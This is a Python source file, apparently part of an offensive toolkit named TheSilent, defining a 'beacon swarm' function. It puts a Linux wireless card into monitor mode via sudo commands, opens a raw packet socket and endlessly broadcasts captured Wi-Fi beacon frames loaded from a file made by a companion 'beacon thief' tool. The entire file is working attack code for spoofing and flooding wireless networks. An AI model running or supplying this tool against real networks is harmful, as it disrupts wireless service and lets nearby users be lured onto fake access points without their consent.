import binascii
import os
import socket
import sys
from sys import platform
from TheSilent.clear import clear

CYAN = "\033[1;36m"
RED = "\033[1;31m"

def beacon_swarm(interface):
    clear()
    try:
        if platform == "linux":
            os.system(f"sudo ip link set {interface} down")
            os.system(f"sudo iw {interface} set monitor control")
            os.system(f"sudo ip link set {interface} up")

        else:
            print(RED + "Unsupported platform! Linux is required for this tool!")
            sys.exit()
            

        my_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
        my_socket.bind((interface, 0))

        beacon_list = []

        if os.path.exists("beacons.txt"):
            with open("beacons.txt", "r") as file:
                for f in file:
                    f = f.replace("\n", "")
                    beacon_list.append(f)

        else:
            print("please use beacon thief first")
            sys.exit()

        print("sending fake beacons")
        while True:
            try:
                for data in beacon_list:
                    my_socket.sendall(binascii.unhexlify(data))

            except OSError:
                os.system(f"sudo ip link set {interface} down")
                os.system(f"sudo iw {interface} set monitor control")
                os.system(f"sudo ip link set {interface} up")
                continue

    except PermissionError:
        print(RED + "ERROR! Permission Denied!")
        sys.exit()
